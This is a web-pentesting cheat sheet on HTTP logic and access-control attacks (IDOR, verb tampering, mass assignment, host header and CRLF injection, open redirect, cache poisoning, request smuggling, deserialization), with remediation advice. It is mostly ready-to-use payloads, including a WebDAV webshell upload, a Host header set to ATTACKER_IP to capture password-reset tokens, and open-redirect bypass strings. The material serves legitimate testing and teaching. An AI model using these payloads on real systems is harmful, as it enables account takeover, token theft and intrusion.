# HTTP Attacks

Abuses of HTTP semantics and application logic include guessing other users' object IDs, tampering with verbs an authorization control forgot to guard, poisoning what the server trusts, and binding hidden fields the developer never meant you to touch. These access-control and logic bugs are often invisible to scanners and demonstrate why understanding the application matters. Map the endpoints first during [Web Enumeration](web-enumeration.md), then work this list against each one.

{% hint style="warning" %}
Most of these are **authorization** failures, not authentication. The app knows *who* you are; it just never checks whether you're allowed to touch *this* object or use *this* method. In the report, name the exact IDs/methods and state that authorization was the missing control — that framing drives the severity.
{% endhint %}

## What to test on every endpoint

| Attack | The flaw | Fastest tell |
| --- | --- | --- |
| **IDOR** | Object ID trusted without an ownership check | Change `id=1` → `id=2`, get someone else's data |
| **Verb tampering** | Auth guards only `GET`/`POST` | `HEAD`/`PUT`/`DELETE` bypasses the control |
| **Mass assignment** | Framework auto-binds every JSON key to the model | Add `"admin":true` to a registration body |
| **Host header injection** | App builds links from the `Host` header | Password-reset link points at your domain |
| **Open redirect** | Redirect target taken from user input | `?url=//attacker` sends victims off-site |
| **CRLF injection** | Newlines injected into a response header | `%0d%0a` splits headers, sets cookies |
| **Request smuggling** | Front-end and back-end disagree on request length | Desync on `CL` vs `TE` |

---

## IDOR — Insecure Direct Object Reference

The app trusts an identifier in the request without checking it belongs to your session. The highest-yield, lowest-effort web bug on most engagements.

```bash
# Read other users' objects — iterate the ID
http://<TARGET>/api/user/1
http://<TARGET>/api/user/2
http://<TARGET>/account?id=1002        # was 1001
http://<TARGET>/invoice/57.pdf         # iterate the number
http://<TARGET>/documents/1

# Write/escalate — act on an object that isn't yours
POST /api/user/5/role                  # change another user's role
http://<TARGET>/admin/user/1
```

### Enumerate it

```bash
# Quick bash sweep of an ID range
for i in $(seq 1 200); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "session=<COOKIE>" http://<TARGET>/api/user/$i)
  echo "user $i -> $code"
done

# Same idea in ffuf, easier to filter by response size
ffuf -w <(seq 1 1000):FUZZ -u http://<TARGET>/api/user/FUZZ \
  -b "session=<COOKIE>" -mc 200 -fs <YOUR_OWN_SIZE>

# Or use Burp Intruder / Repeater to swap IDs and diff responses
```

### Where the IDs hide

Not always a bare number. Watch these parameter names and formats:

```
user_id=1        account_id=123      doc_id=456       report_id=789
customer_ref=ABC-123     invoice_num=INV-001
```

{% hint style="info" %}
Predictable non-numeric IDs still count. Sequential refs (`INV-001`, `INV-002`), base64-wrapped integers, and short hashes of the row ID are all IDOR when there's no ownership check. Decode the identifier before assuming it's random.
{% endhint %}

---

## HTTP Verb Tampering

An authentication/authorization control that only inspects `GET` and `POST` can be walked around with another method — or a method-override header that a proxy honours.

```bash
curl -X OPTIONS http://<TARGET>/admin      # what methods are allowed?
curl -X HEAD    http://<TARGET>/admin      # sometimes bypasses GET-only auth
curl -X PUT     http://<TARGET>/admin
curl -X DELETE  http://<TARGET>/admin
curl -X TRACE   http://<TARGET>/admin
curl -X PATCH   http://<TARGET>/admin

# WebDAV methods — file write / move to a webshell
curl -X PROPFIND http://<TARGET>/
curl -X MKCOL http://<TARGET>/newdir
curl -X PUT http://<TARGET>/shell.php --data-binary @shell.php
curl -X MOVE -H "Destination: http://<TARGET>/shell.php" http://<TARGET>/file.txt
```

### Method-override headers

Some frameworks let a header rewrite the effective method — useful when the server blocks the verb outright but the router still honours the override.

```
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-Original-Method: DELETE
X-Rewrite-URL: /delete-endpoint
```

---

## Mass Assignment

Frameworks that auto-bind request keys to model attributes (Rails, Laravel, Django REST, Node, ASP.NET) let you set fields the form never showed — `admin`, `role`, `balance`, `verified`.

```bash
# Normal registration:
POST /register    {"username":"user","email":"user@example.com"}

# Inject privileged fields the backend blindly binds:
POST /register    {"username":"user","email":"user@example.com","admin":true}
POST /register    {"username":"user","email":"user@example.com","role":"admin"}
POST /register    {"username":"user","email":"user@example.com","confirmed":true,"balance":99999}
```

### Discovery

```bash
# 1. Diff a GET on your own object — extra fields in the response are bind candidates
# 2. Fuzz common privileged keys into POST/PUT bodies:
admin, is_admin, isAdmin, role, user_type, userType, privilege,
verified, confirmed, active, balance, credits, group, permissions
# 3. Burp "Param Miner" surfaces hidden params automatically
```

---

## Host Header Injection

When the app builds absolute URLs (password-reset links, cache keys) from the client-supplied `Host` header, you control where those links point.

```http
POST /reset HTTP/1.1
Host: <ATTACKER_IP>

email=victim@target.com
```

The victim's reset email now contains a link to your server — when they click it, the token lands in your access log. Also try `X-Forwarded-Host: <ATTACKER_IP>` when a proxy rewrites `Host`.

---

## Open Redirect

A redirect parameter that isn't validated sends victims to an attacker site under the target's trusted name — useful for phishing and for chaining to OAuth token theft.

```
http://<TARGET>/redirect?url=http://<ATTACKER_IP>
http://<TARGET>/go?destination=//<ATTACKER_IP>
http://<TARGET>/page?return=javascript:alert(1)
```

### Filter bypass

```
//attacker.com                 # scheme-relative
/\/attacker.com
http:attacker.com
http:\attacker.com
@attacker.com                  # userinfo confusion
%0Ahttp://attacker.com         # newline prefix
https://target.com.attacker.com   # target as a subdomain of yours
```

---

## CRLF Injection & Response Splitting

Inject `%0d%0a` (carriage-return + line-feed) into a value the server reflects into a response header. You can set cookies, seed cache poisoning, or split the response to inject a body.

```
# Set an attacker-controlled cookie
http://<TARGET>/page%0d%0aSet-Cookie:%20admin=true

# Add an arbitrary header
http://<TARGET>/page%0d%0aX-Injected:%20value

# Full response split — inject a body after a blank line
http://<TARGET>/page?param=x%0d%0aContent-Length:%200%0d%0a%0d%0a<script>alert(1)</script>

# In a Location redirect
Location: http://<ATTACKER_IP>%0d%0aSet-Cookie:%20session=hacked
```

---

## Cache Poisoning

Get a shared cache to store a malicious response keyed to a normal URL, then serve it to every subsequent visitor. Look for unkeyed inputs (headers not part of the cache key) that still influence the body.

```http
GET /vulnerable?utm_content=<img src=x onerror=alert(1)> HTTP/1.1
Host: <TARGET>
X-Forwarded-Host: <ATTACKER_IP>

# If the cache stores this, the next normal visitor is served the poisoned body:
GET /vulnerable HTTP/1.1
Host: <TARGET>
```

---

## HTTP Request Smuggling (advanced)

Desync the front-end proxy and back-end server on how they measure request length: the front end trusts `Content-Length`, while the back end trusts `Transfer-Encoding`, or vice versa. It is uncommon but important to recognize.

### CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Content-Length: 3

8c
POST /admin HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

admin=true
0

```

Detection is easiest with Burp's HTTP Request Smuggler extension (timing + differential probes) rather than by hand.

---

## Serialization Issues

If the app calls `unserialize()` / `readObject()` on data you control, a gadget chain can reach code execution.

```php
// PHP object injection — target uses unserialize() on user input
O:8:"stdClass":1:{s:4:"name";s:5:"value";}
O:4:"File":1:{s:4:"name";s:11:"/etc/passwd";}
```

```
# Java serialized object — magic bytes in base64: rO0AB... / raw: aced0005
# Generate a gadget with ysoserial:
java -jar ysoserial.jar CommonsCollections5 'id' | base64
```

See [Server-Side Attacks](server-side-attacks.md) for the full ViewState / JNDI / Java-deserialization chains.

---

## Credential Exposure in HTTP

Cheap wins worth checking on every request/response:

```
# Basic auth header — base64, not encryption
Authorization: Basic dXNlcjpwYXNzd29yZA==     # echo | base64 -d -> user:password

# Secrets in the URL (logged everywhere — proxies, history, referer)
http://<TARGET>/api?key=sk-1234567890
http://<TARGET>/api?token=Bearer_TOKEN_HERE
```

---

## Testing methodology

```
1.  Map every endpoint and method  (see Web Enumeration)
2.  IDOR: swap every ID you see; iterate ranges; diff responses
3.  Verb tampering: OPTIONS each endpoint, then try PUT/DELETE/HEAD + overrides
4.  Mass assignment: add admin/role/verified keys to POST/PUT bodies
5.  Open redirect: test every url/redirect/return/next parameter + bypasses
6.  Host header: poison password reset and any absolute-URL feature
7.  CRLF: inject %0d%0a into anything reflected into a header
8.  Cache poisoning: probe unkeyed headers on cacheable responses
9.  Request smuggling: run Burp's smuggler on the proxy chain
10. Serialization & creds: check for unserialize(), base64 auth, keys in URLs
```

## Prove impact, don't just find the bug

A `200` on someone else's `user/2` is the proof; *the data you read as them* is the finding. Verb tampering that reaches `/admin` matters because of what the admin page does. For the [report](report-writing.md), show the exact request, the exact IDs/methods, and the concrete data or action it exposed — that is what sets the severity.

## Fix guidance (for the remediation section)

* **IDOR** — enforce object-level authorization on every request server-side (does *this* session own *this* object?); never rely on the ID being unguessable.
* **Verb tampering** — apply auth to all methods, not a whitelist; disable unused verbs (`PUT`, `DELETE`, WebDAV) and ignore method-override headers.
* **Mass assignment** — bind only an explicit allowlist of fields (Rails strong params, Laravel `$fillable`, DRF `Meta.fields`, `_.pick()` in Node).
* **Host header** — build absolute URLs from a server-side canonical hostname, never the request header; validate `Host` against an allowlist.
* **Open redirect** — redirect only to relative paths or an allowlist of hosts.
* **CRLF / response splitting** — strip `\r`/`\n` from any value placed in a header; use framework header APIs that reject them.
* **Request smuggling** — normalize on one length header at the edge; reject requests carrying both `Content-Length` and `Transfer-Encoding`; use HTTP/2 end-to-end.

## Related

* [Web Enumeration](web-enumeration.md) — enumerate the endpoints and methods first
* [Server-Side Attacks](server-side-attacks.md) — SSRF/XXE/SSTI and the deserialization chains
* [XSS](xss.md) — the reflected payload cache poisoning delivers; CSRF pairs with IDOR
* [SQL Injection](sql-injection.md) · [Command Injection](command-injection.md) · [File Inclusion](file-inclusion.md) · [File Upload](file-upload.md)
* [Enumeration & Scanning](enumeration-scanning.md) — port/service context for the web layer
* [Report Writing](report-writing.md) — framing an access-control finding
